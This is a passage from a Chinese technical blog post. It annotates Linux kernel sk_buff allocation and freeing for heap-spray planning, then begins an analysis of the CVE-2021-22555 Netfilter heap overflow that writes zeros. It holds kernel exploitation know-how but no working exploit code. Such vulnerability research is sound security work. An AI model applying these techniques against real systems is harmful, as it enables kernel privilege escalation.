class="comment">//先对齐，这个和L1_CACHE_BYTES有关,64位系统即和64(0x40)对齐,32位类似，具体的还是查一下最好</span></span><br><span class="line">	size = SKB_DATA_ALIGN(size);</span><br><span class="line">    <span class="comment">//size += 对齐之后的0x140</span></span><br><span class="line">    <span class="comment">//那么size只可能是0x140+n*0x40,最低为0x180,属于kmalloc-512</span></span><br><span class="line">	size += SKB_DATA_ALIGN(<span class="keyword">sizeof</span>(struct skb_shared_info));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//虽然是kmalloc_reserve函数，但是最终还是kmalloc形式</span></span><br><span class="line">    <span class="comment">//调用到`__kmalloc_node_track_caller`函数进行分配</span></span><br><span class="line">    <span class="comment">//这个data即为我们实际的存储数据的地方,也是从kmalloc申请出的堆块</span></span><br><span class="line">    <span class="comment">//并且是从对开的开头位置处开始存储,完成内存申请后返回unix_stream_sendmsg函数</span></span><br><span class="line">    <span class="comment">//在`skb_copy_datagram_from_iter`函数中数据会被复制</span></span><br><span class="line">	data = kmalloc_reserve(size, gfp_mask, node, &amp;pfmemalloc);</span><br><span class="line">	<span class="keyword">if</span> (!data)</span><br><span class="line">		<span class="keyword">goto</span> nodata;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">	size = SKB_WITH_OVERHEAD(ksize(data));</span><br><span class="line">	<span class="comment">//....</span></span><br><span class="line">    <span class="comment">//初始化头部的管理结构</span></span><br><span class="line">	<span class="built_in">memset</span>(skb, <span class="number">0</span>, offsetof(struct sk_buff, tail));</span><br><span class="line">	<span class="comment">/* Account for allocated memory : skb + skb-&gt;head */</span></span><br><span class="line">	skb-&gt;truesize = SKB_TRUESIZE(size);</span><br><span class="line">	skb-&gt;pfmemalloc = pfmemalloc;</span><br><span class="line">	refcount_set(&amp;skb-&gt;users, <span class="number">1</span>);</span><br><span class="line">	skb-&gt;head = data;</span><br><span class="line">	skb-&gt;data = data;</span><br><span class="line">	skb_reset_tail_pointer(skb);</span><br><span class="line">	skb-&gt;end = skb-&gt;tail + size;</span><br><span class="line">	skb-&gt;mac_header = (typeof(skb-&gt;mac_header))~<span class="number">0U</span>;</span><br><span class="line">	skb-&gt;transport_header = (typeof(skb-&gt;transport_header))~<span class="number">0U</span>;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> skb;</span><br><span class="line">nodata:</span><br><span class="line">	kmem_cache_free(cache, skb);</span><br><span class="line">	skb = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h6 id="内存申请总结：-1"   >
          <a href="#内存申请总结：-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#内存申请总结：-1" class="headerlink" title="内存申请总结："></a>内存申请总结：</h6>
      <ul>
<li><code>sk_buff</code>为数据的管理结构从专门的缓存池<code>skbuff_fclone_cache/skbuff_head_cache</code>中申请内存，没办法进行控制</li>
<li><code>skb-&gt;data</code>为实际的数据结构<ul>
<li><code>size</code>：<code>0x140+n*0x40</code>(0x40的倍数补齐)。即如果传入的数据长度为0x3f，则n为1，传入数据为0x41，则n为2。</li>
<li>堆块申请：走<code>kmalloc</code>进行申请，比较常见的种类，方便堆喷。</li>
</ul>
</li>
<li>每调用<code>wirte</code>函数写入一次数据，都会走一遍流程，申请新的<code>sk_buff</code>和<code>skb-&gt;data</code>，不同消息之间相互独立。</li>
</ul>

        <h5 id="B-数据复制-1"   >
          <a href="#B-数据复制-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-数据复制-1" class="headerlink" title="B.数据复制"></a>B.数据复制</h5>
      <p>相关内存申请完成之后，回到<code>unix_stream_sendmsg</code>函数，开始进行数据复制<code>skb_copy_datagram_from_iter</code>，即上述提到的。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/core/datagram.c</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">skb_copy_datagram_from_iter</span><span class="params">(struct sk_buff *skb, <span class="keyword">int</span> offset,</span></span></span><br><span class="line"><span class="params"><span class="function">                                struct iov_iter *from,</span></span></span><br><span class="line"><span class="params"><span class="function">                                <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> start = skb_headlen(skb);			<span class="comment">// skb-&gt;len - skb-&gt;data_len;</span></span><br><span class="line">    <span class="keyword">int</span> i, copy = start - offset;			<span class="comment">// copy 是线性数据区的剩余空间大小</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">frag_iter</span>;</span></span><br><span class="line">    <span class="comment">//拷贝到申请的保存数据的堆块skb-&gt;data</span></span><br><span class="line">    <span class="keyword">if</span> (copy &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (copy &gt; len)</span><br><span class="line">            copy = len;</span><br><span class="line">        <span class="keyword">if</span> (copy_from_iter(skb-&gt;data + offset, copy, from) != copy)</span><br><span class="line">            <span class="keyword">goto</span> fault;</span><br><span class="line">        <span class="keyword">if</span> ((len -= copy) == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        offset += copy;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h4 id="②释放-4"   >
          <a href="#②释放-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#②释放-4" class="headerlink" title="②释放"></a>②释放</h4>
      <p>当从<code>socker</code>套接字中读取出某条信息的所有数据时，就会发生该条信息的相关内存的释放，即该条信息对应<code>sk_buff</code>和<code>skb-&gt;data</code>的释放。同样的，如果该条信息没有被读取完毕，则不会发生该信息相关内存的释放。</p>
<p>在<code>read</code>时进行的函数调用链：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read -&gt; ksys_read() -&gt; vfs_read() -&gt; new_sync_read() -&gt; call_read_iter() -&gt; sock_read_iter() -&gt; sock_recvmsg() -&gt; sock_recvmsg_nosec() -&gt; unix_stream_recvmsg() -&gt; unix_stream_read_generic()</span><br></pre></td></tr></table></div></figure>

<p>同样的在<code>unix_stream_read_generic</code>处开始分叉，也是分为两部分，下面截取重要部分</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/unix/af_unix.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">unix_stream_read_generic</span><span class="params">(struct unix_stream_read_state *state,</span></span></span><br><span class="line"><span class="params"><span class="function">				    <span class="keyword">bool</span> freezable)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">//....</span></span><br><span class="line">		chunk = <span class="keyword">min_t</span>(<span class="keyword">unsigned</span> <span class="keyword">int</span>, unix_skb_len(skb) - skip, size);</span><br><span class="line">		skb_get(skb);</span><br><span class="line">        <span class="comment">//------------------分叉一:数据复制</span></span><br><span class="line">        <span class="comment">//recv_actor函数指针是在unix_stream_recvmsg函数中定义的state函数表</span></span><br><span class="line">        <span class="comment">//该函数指针对应unix_stream_read_actor函数,即从这开始进行数据复制</span></span><br><span class="line">		chunk = state-&gt;recv_actor(skb, skip, chunk, state);</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">        <span class="comment">//传输数据完成之后,skb-&gt;users从2改为1,表示已经复制完数据了,方便后续判断</span></span><br><span class="line">        <span class="comment">//消息中是否还有数据</span></span><br><span class="line">		consume_skb(skb);</span><br><span class="line">		<span class="keyword">if</span> (chunk &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (copied == <span class="number">0</span>)</span><br><span class="line">				copied = -EFAULT;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		copied += chunk;</span><br><span class="line">		size -= chunk;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Mark read part of skb as used */</span></span><br><span class="line">		<span class="keyword">if</span> (!(flags &amp; MSG_PEEK)) &#123;</span><br><span class="line">            <span class="comment">//修改skb类型转换之后对应的consumed字段,其实就是skb-&gt;cb某个位置处的数据</span></span><br><span class="line">            <span class="comment">//#define UNIXCB(skb)	(*(struct unix_skb_parms *)&amp;((skb)-&gt;cb))</span></span><br><span class="line">			UNIXCB(skb).consumed += chunk;</span><br><span class="line">			<span class="comment">//依据上面的consumed和len来判断消息中是否还剩下没有传输的数据</span></span><br><span class="line">            <span class="comment">//有(1)则break,无(0)则进入后续的内存释放阶段</span></span><br><span class="line">			<span class="keyword">if</span> (unix_skb_len(skb))</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">//------------------------分叉二:内存释放</span></span><br><span class="line">            <span class="comment">//内存释放前置工作</span></span><br><span class="line">			skb_unlink(skb, &amp;sk-&gt;sk_receive_queue);</span><br><span class="line">            <span class="comment">//进入该函数,通过对于skb-&gt;users的判断之后,进入内存释放阶段</span></span><br><span class="line">			consume_skb(skb);</span><br><span class="line">            <span class="comment">//....................</span></span><br><span class="line">	&#125; <span class="keyword">while</span> (size);</span><br><span class="line">        <span class="comment">//......................</span></span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> copied ? : err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h5 id="A-数据复制"   >
          <a href="#A-数据复制" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-数据复制" class="headerlink" title="A.数据复制"></a>A.数据复制</h5>
      <p>之后的函数调用链为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unix_stream_read_actor() -&gt; skb_copy_datagram_msg() -&gt; skb_copy_datagram_iter() -&gt; __skb_datagram_iter()</span><br></pre></td></tr></table></div></figure>

<p>最终进入<code>__skb_datagram_iter</code>，</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/core/datagram.c</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __skb_datagram_iter(<span class="keyword">const</span> struct sk_buff *skb, <span class="keyword">int</span> offset,</span><br><span class="line">			       struct iov_iter *to, <span class="keyword">int</span> len, <span class="keyword">bool</span> fault_short,</span><br><span class="line">			       <span class="keyword">size_t</span> (*cb)(<span class="keyword">const</span> <span class="keyword">void</span> *, <span class="keyword">size_t</span>, <span class="keyword">void</span> *,</span><br><span class="line">					    struct iov_iter *), <span class="keyword">void</span> *data)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> start = skb_headlen(skb);</span><br><span class="line">	<span class="keyword">int</span> i, copy = start - offset, start_off = offset, n;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">frag_iter</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Copy header. */</span></span><br><span class="line">    <span class="comment">//这个header指的就是数据data,大概就是从这里开始实际的数据</span></span><br><span class="line">	<span class="keyword">if</span> (copy &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (copy &gt; len)</span><br><span class="line">			copy = len;</span><br><span class="line">		n = INDIRECT_CALL_1(cb, simple_copy_to_iter,</span><br><span class="line">				    skb-&gt;data + offset, copy, data, to);</span><br><span class="line">		offset += n;</span><br><span class="line">		<span class="keyword">if</span> (n != copy)</span><br><span class="line">			<span class="keyword">goto</span> short_copy;</span><br><span class="line">		<span class="keyword">if</span> ((len -= copy) == <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    <span class="comment">/* Copy paged appendix. Hmm... why does this look so complicated? */</span></span><br><span class="line">    <span class="comment">//linux内核维护人员都看不下去了,xs</span></span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>这里使用了感觉很复杂的机制，不是很懂。</p>

        <h5 id="B-内存释放"   >
          <a href="#B-内存释放" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-内存释放" class="headerlink" title="B.内存释放"></a>B.内存释放</h5>
      <p>进入内存释放的函数调用链为</p>
<ul>
<li><p>释放<code>skb-&gt;data</code>部分：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">consume_skb()-&gt;__kfree_skb()-&gt;skb_release_all()-&gt;skb_release_all()-&gt;skb_release_data()-&gt;skb_free_head()</span><br></pre></td></tr></table></div></figure>

<p>对应函数如下：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/core/skbuff.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">skb_free_head</span><span class="params">(struct sk_buff *skb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//其实head和data是一样的</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *head = skb-&gt;head;</span><br><span class="line">	<span class="keyword">if</span> (skb-&gt;head_frag) &#123;</span><br><span class="line">		<span class="keyword">if</span> (skb_pp_recycle(skb, head))</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		skb_free_frag(head);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		kfree(head);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>可以看到使用的正常的<code>kfree</code>函数</p>
</li>
<li><p>释放<code>skb</code>部分：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">consume_skb()-&gt;__kfree_skb()-&gt;kfree_skbmem()</span><br></pre></td></tr></table></div></figure>

<p>相关函数如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/core/skbuff.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">kfree_skbmem</span><span class="params">(struct sk_buff *skb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sk_buff_fclones</span> *<span class="title">fclones</span>;</span></span><br><span class="line">    <span class="comment">//克隆体相关的,没有fork之类的话一般不用太管的</span></span><br><span class="line">    <span class="keyword">switch</span> (skb-&gt;fclone) &#123;</span><br><span class="line">        <span class="keyword">case</span> SKB_FCLONE_UNAVAILABLE:</span><br><span class="line">            <span class="comment">//用专门的cache(skbuff_head_cache)进行回收</span></span><br><span class="line">            kmem_cache_free(skbuff_head_cache, skb);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> SKB_FCLONE_ORIG:</span><br><span class="line">            fclones = container_of(skb, struct sk_buff_fclones, skb1);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* We usually free the clone (TX completion) before original skb</span></span><br><span class="line"><span class="comment">		 * This test would have no chance to be true for the clone,</span></span><br><span class="line"><span class="comment">		 * while here, branch prediction will be good.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">            <span class="keyword">if</span> (refcount_read(&amp;fclones-&gt;fclone_ref) == <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">goto</span> fastpath;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>: <span class="comment">/* SKB_FCLONE_CLONE */</span></span><br><span class="line">            fclones = container_of(skb, struct sk_buff_fclones, skb2);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!refcount_dec_and_test(&amp;fclones-&gt;fclone_ref))</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">fastpath:</span><br><span class="line">    <span class="comment">//用专门的cache(skbuff_fclone_cache)进行回收克隆的skb</span></span><br><span class="line">    kmem_cache_free(skbuff_fclone_cache, fclones);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>这个就不太好利用了。</p>
<p>同样的，当关闭的信道的两端，该信道内产生的所有的<code>sk_buff</code>和<code>skb-&gt;data</code>都会得到释放</p>
</li>
</ul>

        <h5 id="内存释放总结："   >
          <a href="#内存释放总结：" class="heading-link"><i class="fas fa-link"></i></a><a href="#内存释放总结：" class="headerlink" title="内存释放总结："></a>内存释放总结：</h5>
      <ul>
<li><p>当从信道中将某条消息全部读取完之后，会发生该条消息对应的<code>sk_buff</code>和<code>skb-&gt;data</code>的内存释放，且<code>sk_buff</code>释放到专门的缓存池中，<code>skb-&gt;data</code>使用正常的<code>kfree</code>释放</p>
</li>
<li><p>当关闭信道两端，该信道内产生的所有的<code>sk_buff</code>和<code>skb-&gt;data</code>都会得到释放，具体的调用链为：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sock_close()-&gt;__sock_release()-&gt;unix_release()-&gt;__kfree_skb()</span><br></pre></td></tr></table></div></figure>

<p>后面就类似了。</p>
</li>
</ul>

        <h1 id="一、漏洞分析"   >
          <a href="#一、漏洞分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、漏洞分析" class="headerlink" title="一、漏洞分析"></a>一、漏洞分析</h1>
      
        <h2 id="前言"   >
          <a href="#前言" class="heading-link"><i class="fas fa-link"></i></a><a href="#前言" class="headerlink" title="前言"></a>前言</h2>
      <p>由于我编译环境的时候老是出问题（后面才解决的），所以直接拿<code>bsauce</code>师傅提供的环境来用了，但是又没有带DEBUG的<code>vmlinux</code>，所以我使用<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/marin-m/vmlinux-to-elf.git" >vmlinux-to-elf</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>简单获取下符号就开始逆向了(xs)，所以下面漏洞分析提到的地址为<code>bsauce</code>师傅环境的地址。</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/254027#h2-1" >CVE-2021-22555 2字节堆溢出写0漏洞提权分析 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>相关的<code>Netfilter</code>分析就不做了，也不太会，可以看看<code>bsauce</code>师傅的，这里主要关注数据的传输过程的一些东西。</p>
<p>通过<code>Netfilter</code>的<code>setsockopt</code>系统调用，传入用户数据<code>&amp;data</code>，可依据该<code>&amp;data</code>中的相关数据进行不同大小的堆块申请。完成申请后，还会对该堆块进行一定的处理，其中就有向堆块末尾填充数据的操作。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(t-&gt;data + target-&gt;targetsize, <span class="number">0</span>, pad);</span><br></pre></td></tr></table></div></figure>

<p>其中<code>t-&gt;data+target-&gt;targetsize</code>即为申请的堆块上末尾处的某个地址，<code>pad</code>为如下定义</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pad = XT_ALIGN(target-&gt;targetsize) - target-&gt;targetsize;</span><br></pre></td></tr></table></div></figure>

<p>其实<code>pad</code>的值即为<code>8 - (target-&gt;targetsize mod 8)</code>，就是所谓的8字节对齐。</p>
<p>并且<code>t-&gt;data</code>的地址偏移和<code>target-&gt;targetsize</code>的值都可被我们直接或间接地控制，那么就可以存在堆块溢出写0的操作了，这里最多溢出4个字节填充为0。</p>
<p>下面是具体的关键函数调用链和相关分析</p>

        <h2 id="1-nf-setsockopt"   >
          <a href="#1-nf-setsockopt" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-nf-setsockopt" class="headerlink" title="1.nf_setsockopt()"></a>1.nf_setsockopt()</h2>
      <p>句柄定义</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11.14 net/ipv4/netfilter/ip_tables.c</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">nf_sockopt_ops</span> <span class="title">ipt_sockopts</span> =</span> &#123;</span><br><span class="line">....</span><br><span class="line">	.get		= do_ipt_get_ctl,</span><br><span class="line">....</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>这样到调用<code>setsockopt</code>系统调用时，就会调用到<code>do_ipt_get_ctl</code>函数。</p>

        <h2 id="2-do-ipt-set-ctl"   >
          <a href="#2-do-ipt-set-ctl" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-do-ipt-set-ctl" class="headerlink" title="2.do_ipt_set_ctl()"></a>2.do_ipt_set_ctl()</h2>
      <ul>
<li><p>参数：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(struct sock *sk, <span class="keyword">int</span> cmd, <span class="keyword">sockptr_t</span> arg, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span><br></pre></td></tr></table></div></figure>

<p>调试如下<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/Img/image-20220501113945278.png" alt="image-20220501113945278"></p>
<p>这个<code>&amp;data</code>即为用户传入的，赋值给<code>sockptr_t arg</code>，从而依据<code>sockptr_t arg</code>来进行堆块申请和相关的漏洞填充操作。</p>
</li>
<li><p>地址：<code>0xffffffff81b0bd20</code></p>
</li>
<li><p>介绍：该函数由<code>nf_sockopt_ops ipt_sockopts</code>进行句柄定义</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">nf_sockopt_ops</span> <span class="title">ipt_sockopts</span> =</span> &#123;</span><br><span class="line">....</span><br><span class="line">	.get		= do_ipt_get_ctl,</span><br><span class="line">....</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>即系统调用<code>setsockopt</code>实际调用到与漏洞方面有关的最早的函数，传入的<code>sockptr_targ</code>即为用户参数<code>&amp;data</code>，后续会调用到<code>compat_do_replace</code>，传入<code>sockptr_t arg</code></p>
</li>
</ul>

        <h2 id="3-compat-do-replace"   >
          <a href="#3-compat-do-replace" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-compat-do-replace" class="headerlink" title="3.compat_do_replace()"></a>3.compat_do_replace()</h2>
      <p>通过<code>_copy_from_user</code>复制<code>&amp;data</code>的<code>0x5c</code>字节给<code>tmp</code></p>
<ul>
<li><p>参数：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(struct net *net, <span class="keyword">sockptr_t</span> arg, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span><br></pre></td></tr></table></div></figure></li>
<li><p>地址：<code>0xffffffff81b0baf0</code></p>
</li>
<li><p>介绍：</p>
<ul>
<li><p>主要关注变量：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//传入的</span></span><br><span class="line"><span class="keyword">sockptr_t</span> arg;</span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义的</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">compat_ipt_replace</span> <span class="title">tmp</span>;</span><span class="comment">//保存size</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_table_info</span> *<span class="title">newinfo</span>;</span></span><br></pre></td></tr></table></div></figure></li>
</ul>
<p>调用<code>translate_compat_table()</code>，传入本函数定义的<code>tmp</code>作为<code>compatr</code>，该变量<code>tmp</code>由函数<code>copy_from_sockptr(&amp;tmp, arg, sizeof(tmp))</code>进行赋值</p>
<ul>
<li>相关函数链：<code>copy_from_sockptr-&gt;copy_from_sockptr-&gt;copy_from_sockptr_offset-&gt;copy_from_user</code></li>
</ul>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11.14 /include/linux/sockptr.h</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">copy_from_sockptr_offset</span><span class="params">(<span class="keyword">void</span> *dst, <span class="keyword">sockptr_t</span> src,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">size_t</span> offset, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!sockptr_is_kernel(src))</span><br><span class="line">		<span class="keyword">return</span> copy_from_user(dst, src.user + offset, size);</span><br><span class="line">	<span class="built_in">memcpy</span>(dst, src.kernel + offset, size);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>这里的<code>dst</code>即为<code>tmp</code>，<code>src</code>即为<code>arg</code>，也就是会依据<code>arg(&amp;data)</code>的内容来给<code>tmp</code>赋值。即最后的<code>compatr</code>的来源为上述提到的<code>sockptr_t arg</code>，也就是用户传入的参数<code>&amp;data</code>。</p>
<p>从<code>&amp;data</code>中复制<code>0x5c(sizeof(struct compat_ipt_replace))</code>大小的给到<code>tmp(compatr)</code>，如下代码所示</p>
